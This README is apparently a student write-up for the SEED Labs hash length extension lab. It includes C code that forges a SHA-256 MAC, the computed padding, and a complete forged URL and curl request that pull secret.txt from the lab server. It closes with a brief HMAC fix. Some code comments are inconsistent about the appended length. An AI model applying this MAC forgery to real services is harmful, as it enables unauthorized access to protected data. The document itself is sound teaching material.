# Hash Length Extension Attack Lab

**Team:** Evan Schreiner & Will Curry
**Fall 2025**


## Project Overview
This repo contains our work for the SEED Labs Hash Length Extension Attack.
- **Evan:** Tasks 1 & 2 (Setup, MAC Analysis, Padding Calculation)
- **Will:** Tasks 3 & 4 (Attack Execution, HMAC Remediation)


## Task 1 & 2

### 1. Target Information

We are attacking the server at `www.seedlab-hashlen.com` (10.9.0.80).
* **Student Name used:** `EvanSchreiner`
* **UID:** `1001`
* **Key:** `123456` (Found in `key.txt`)

### 2. The Baseline Request

This is the valid request we generated. We will extend this message.
* **Original Command String (R):** `myname=EvanSchreiner&uid=1001&lstcmd=1`
* **Original MAC Hash:** `53f5e9d89774bf0f1050fb4cadc83ca04465e56afd17a3cde64c64c989a9faa1`
    * *Note to Will: You must use this hash to initialize the registers in `length_ext.c`.*

### 3. The Calculated Padding
I calculated the SHA-256 padding for the 64-byte block.
* **Padding Hex:** `80000000000000000000000000000000000168`
* **Padding URL Encoded:** `%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68`
* **Length Field (Hex):** `0x168` (360 bits)


## Task 3 (*Will*)
**Objective:** Forge a signature for `&download=secret.txt` without knowing the key.

1.  Open `length_ext.c`.
2.  Input the **Original MAC Hash** (from Section 2 above) into the `c.h[]` registers.
    * *Note: Use `htole32` because our VM is Little Endian.*

3.  Update the length field in the code to `64 + len("Extra message")`.
    * *Note: The C code needs the total length of the forged message to finalize the hash correctly.*

length_ext.c after 2 and 3
Change C file, adding hash into registers, and comment out length field
```
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[]) {
        int i;
        unsigned char buffer[SHA256_DIGEST_LENGTH];
        SHA256_CTX c;

        SHA256_Init(&c);

        // Process Original Message Length
        for(i=0; i<64; i++)
                SHA256_Update(&c, "*", 1);

        // TODO: Paste the Original MAC hash from Task 1 below.
        // Break the hash into 8 chunks of 8 hex characters.
        c.h[0] = htole32(0x53f5e9d8);
        c.h[1] = htole32(0x9774bf0f);
        c.h[2] = htole32(0x1050fb4c);
        c.h[3] = htole32(0xadc83ca0);
        c.h[4] = htole32(0x4465e56a);
        c.h[5] = htole32(0xfd17a3cd);
        c.h[6] = htole32(0xe64c64c9);
        c.h[7] = htole32(0x89a9faa1);
        // continue...

        // Total length of the forged message = (Key + Message + Padding).
        // 64 bytes (original block) + 13 bytes ("&download=secret.txt") * 8 bits/byte

        //c.Nl = (64 + 20) * 8;
        //c.Nh = 0;

        // Append the extra message
        SHA256_Update(&c, "&download=secret.txt", 20);

        SHA256_Final(buffer, &c);

        // Print the new forged MAC
        for(i=0; i<32; i++) {
                printf("%02x", buffer[i]);
        }
        printf("\n");
        return 0;
}
```

4.  Compile and Run:
    ```bash
    gcc length_ext.c -o length_ext -lcrypto
    ./length_ext
    ```

    Result from running:
    ```4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```
    
6.  Construct the Attack URL:
    `http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1` + `[Padding URL Encoded]` + `&download=secret.txt` + `&mac=[New_Forged_MAC]`

URL contructed
    ```http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```

run in terminal
```bash
    curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1"
 ```

expected result
<img width="688" height="420" alt="image" src="https://github.com/user-attachments/assets/d9c84e1a-c3e6-4623-b92b-ff1c2b800d05" />





## Task 4 (Remediation)
1.  Open `lab.py` (the server code).
2.  Replace the insecure SHA-256 concatenation with `hmac.new`.
3.  Rebuild the docker container (`dcbuild && dcup`) and verify the attack above no longer works.



